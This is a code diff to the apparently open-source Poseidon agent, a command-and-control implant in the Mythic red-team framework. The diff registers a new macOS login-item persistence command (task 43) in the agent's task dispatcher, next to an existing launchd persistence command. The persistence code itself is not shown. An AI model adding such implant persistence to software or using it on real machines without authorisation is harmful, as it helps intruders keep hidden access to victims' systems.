@@ -33,6 +33,8 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/ls"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mkdir"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/mv"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launchd"
+	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_loginitem"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/profiles"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/functions"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/pkg/utils/structs"
@@ -50,7 +52,6 @@ import (
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/upload"
 	"github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/xpc"
 )
-import "github.com/MythicAgents/poseidon/Payload_Type/poseidon/agent_code/persist_launchd"
 
 const (
 	NONE_CODE = 100
@@ -206,6 +207,7 @@ func main() {
 		"jsimport":          40,
 		"jsimport_call":     41,
 		"persist_launchd":   42,
+		"persist_loginitem": 43,
 		"none":              NONE_CODE,
 	}
 
@@ -623,6 +625,10 @@ func main() {
 				case 42:
 					//Execute persist_launch command to install launchd persistence
 					go persist_launchd.Run(task.Tasks[j])
+					break
+				case 43:
+					// Execute persist_loginitem command to install login item persistence
+					go persist_loginitem.Run(task.Tasks[j])
 					break
 				case NONE_CODE:
 					// No tasks, do nothing
